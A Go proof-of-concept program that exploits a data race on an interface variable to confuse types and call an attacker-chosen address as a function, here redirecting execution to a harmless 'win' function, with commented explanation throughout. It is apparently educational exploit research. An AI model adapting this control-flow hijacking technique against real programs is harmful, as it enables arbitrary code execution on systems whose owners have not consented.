/*
Inspiration from https://github.com/StalkR/misc
*/
package main

import (
	"fmt"
	"os"
	"runtime"
	"strconv"
)

// Utility functions

// i and j simply hold the loop counters for the `main` coroutine, and the spawned coroutine.
var i, j int

// address simply returns the integer address of a given parameter.
func address(i interface{}) int {
	addr, err := strconv.ParseUint(fmt.Sprintf("%p", i), 0, 0)
	if err != nil {
		panic(err)
	}
	return int(addr)
}

// For our example, we will be invoking `win` through the `StructIntPtr`'s 	`funcptr` field.
// Win is a simple target because it expects no parameters, so we don't have to groom the stack.
func win() {
	fmt.Println("win", i, j)
	os.Exit(1)
}

// Interface defines the interface which both types in our race must comply with.
// In this case, each type must implement a function `X` with no return value.
type Interface interface {
	Exec()
}

// StructIntPtr contains a single field, `funcptr`, which in our case is some sort of user-controlled
// address. Effectively, this is the field pointing to the address we would like to execute during our
// race.
type StructIntPtr struct {
	funcintptr *int
}

// X is stubbed out in the StructIntPtr for our example, so we don't have to worry about other logic
// impeding our ability to hit the race condition.
func (s StructIntPtr) Exec() {}

// StructFuncPtr defines an interface with a normal `funcptr` (the typical way you would reference a function pointer).
// This structure is what will execute our stale (`funcintptr`) address, as `funcptr` will inherit the value of `StructIntPtr.funcintptr`.
type StructFuncPtr struct {
	funcptr func()
}

func (u StructFuncPtr) Exec() {
	// Because we are not initializing `u.`
	if u.funcptr != nil {
		u.funcptr()
	}
}

func main() {
	// A minimum of two CPUs are necessary, since our corouines must execute on different MPs.
	if runtime.NumCPU() < 2 {
		fmt.Println("need >= 2 CPUs")
		os.Exit(1)
	}

	// The winAddr is the address of the `win` function.
	winAddr := address(win)

	// We are defining the variables involved in the race:
	//
	// * `confused`: The confused variable is what will be used as a proxy to `a` and `b`
	// * `a`: The struct we will be using during the race to overwrite `StructFuncPtr.funcptr` in `b`.
	// * `b`: The struct we will be executing our inherited `funcintptr` value from `a` within.
	var confused, a, b Interface
	a = &StructIntPtr{funcintptr: &winAddr}
	b = &StructFuncPtr{}

	// Since confused was not initialized to a value, we are going to start with a value of a,
	// Which has a stubbed `X`. That way, we can let the coroutine spawn and start assigning values
	// to `confused` between `a` and `b`.
	confused = a

	// Spawn the racy coroutine.
	go func() {
		// We are going to infinitely loop, reassigning confused back and forth between `a` and `b`.
		// When the race condition is hit in the mainthread, this coroutine won't matter anymore,
		// As we will be able to begin controlling execution flow, regardless of `confused`.
		for {
			confused = b

			// We need to keep the assignment to `confused` from being inlined by the compiler.
			// Referencing `confused` from inside an inlined function will allow us to force
			// inlining to be too expensive.
			func() {
				if i >= 0 {
					return
				}
				fmt.Println(confused)
			}()

			confused = a
			// Bump i to show how many times (roughly) the spawned coroutine executed prior to
			// achieving control of execution flow.
			i++
		}
	}()

	// In the `main` coroutine, repeatedly executes `confused.Exec()` so we can attempt
	// to invoke the `funcintptr` value leftover from `a`, as `funcptr`.
	for {
		confused.Exec()
		j++
	}
}
